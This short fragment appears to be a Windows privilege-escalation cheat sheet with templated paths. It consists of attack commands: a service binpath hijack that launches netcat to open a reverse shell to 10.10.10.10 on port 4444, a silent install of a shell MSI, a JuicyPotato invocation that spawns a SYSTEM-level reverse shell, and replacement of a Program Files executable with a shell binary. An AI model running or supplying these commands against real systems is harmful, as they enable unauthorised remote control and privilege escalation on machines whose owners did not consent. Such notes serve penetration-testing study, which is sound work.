...
sc stop MyService
sc config MyService binpath= "{{USER_HOME}}/nc.exe 10.10.10.10 4444 -e cmd.exe"
sc start MyService
...
msiexec /quiet /qn /i {{USER_HOME}}/shell.msi
...
# Run JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c {{USER_HOME}}/nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
...
copy {{USER_HOME}}/shell.exe "C:\Program Files\Vuln.exe"
